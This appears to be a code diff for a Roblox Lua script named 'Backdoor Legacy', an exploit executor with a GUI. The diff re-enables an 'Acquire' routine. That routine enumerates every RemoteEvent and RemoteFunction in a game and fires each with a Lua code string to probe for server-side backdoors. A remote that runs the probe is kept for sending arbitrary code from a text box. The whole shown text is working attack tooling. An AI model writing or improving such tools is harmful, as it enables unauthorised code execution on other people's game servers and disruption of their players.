@@ -1,4 +1,7 @@
 print("Backdoor Legacy // Successfully booted up!")
+local function debug(msg)
+	game:GetService('TestService'):Message('BackdoorLegacy [DEBUG] // '..tostring(msg)) 
+end 
 
 -- Create GUI Objects
 
@@ -91,7 +94,6 @@ Labely.TextColor3 = Color3.new(1,0,0)
 
 local AcquiredRemote = nil 
 local IsAcquiring = false 
-local IsAcquireDisabled = true 
 
 Execy.MouseButton1Click:Connect(function()
 	-- Fetch code from TextBox.
@@ -138,44 +140,49 @@ end)
 
 -- THE ACQUIRE FEATURE IS CURRENTLY UNDER DEVELOPMENT
 
-Acqur.MouseButton1Click:Connect(function() if isAcquireDisabled == false then if not isAcquiring then 
-	warn('BackdoorLegacy // Scanning Started!') 
-	Cody.Text = '-- Please wait, while we are scanning the remotes.'
-	local RemoteList = {} 
-	local CurrentRemote = nil 
-	local isFound = false
-	isAcquiring = true 
-	for i,v in pairs(game:GetDescendants()) do 
-		if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
-			table.insert(RemoteList,v) 
-		end 
-	end 
-	for a,b in pairs(RemoteList) do if AcquiredRemote == nil then 
-		print("BackdoorLegacy // Checking "..b.ClassName..' "'..b.Name..'".') 
-		local NeededNameOfModel = tostring(math.random(math.random(1,16),math.random(24,32))) 
-		local NeededCode = 'Instance.new("Model",workspace).Name = '..NeededNameOfModel 
-		CurrentRemote = b
-		if b:IsA('RemoteEvent') then 
-			b:FireServer(NeededCode) 
-		elseif b:IsA('RemoteFunction') then 
-			task.spawn(function() b:InvokeServer(NeededCode) end) 
-		end 
-		wait(5) 
-		if workspace:FindFirstChild(NeededNameOfModel) then 
-			if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
-				AcquiredRemote = b
+Acqur.MouseButton1Click:Connect(function() 
+	if not isAcquiring then 
+		warn('BackdoorLegacy // Scanning Started!') 
+		Cody.Text = '-- Please wait, while we are scanning the remotes.'
+		local RemoteList = {} 
+		local CurrentRemote = nil 
+		local isFound = false
+		isAcquiring = true 
+		for i,v in pairs(game:GetDescendants()) do 
+			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
+				table.insert(RemoteList,v) 
 			end 
 		end 
+		for a,b in pairs(RemoteList) do if AcquiredRemote == nil then 
+			print("BackdoorLegacy // Checking "..b.ClassName..' "'..b.Name..'".') 
+			local NeededNameOfModel = tostring(math.random(math.random(1,16),math.random(24,32))) 
+			local NeededCode = 'Instance.new("Model",workspace).Name = '..NeededNameOfModel 
+			CurrentRemote = b
+			if b:IsA('RemoteEvent') then 
+				b:FireServer(NeededCode) 
+			elseif b:IsA('RemoteFunction') then 
+				task.spawn(function() b:InvokeServer(NeededCode) end) 
+			end 
+			wait(5) 
+			if workspace:FindFirstChild(NeededNameOfModel) then 
+				if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
+					AcquiredRemote = b
+				end 
+			end 
+		end 	
+		if AcquiredRemote ~= nil then 
+			isFound = true 
+			Cody.Text = '-- Remote acquired! :D' 
+			warn('BackdoorLegacy // Remote acquired! :D')
+		else 
+			isFound = false 
+			Cody.Text = '-- Not found. :(' 
+			warn('BackdoorLegacy // Not found. :(')
+		end 
+		isAcquiring = false 
+		return isFound 
 	end 
-	if AcquiredRemote ~= nil then 
-		isFound = true 
-		Cody.Text = '-- Remote acquired! :D'
-	else 
-		isFound = false 
-		Cody.Text = '-- Not found. :('
-	end 
-	isAcquiring = false 
-	return isFound 
-end end end end)
+end 
+end)
 
 -- That's the end of the code!
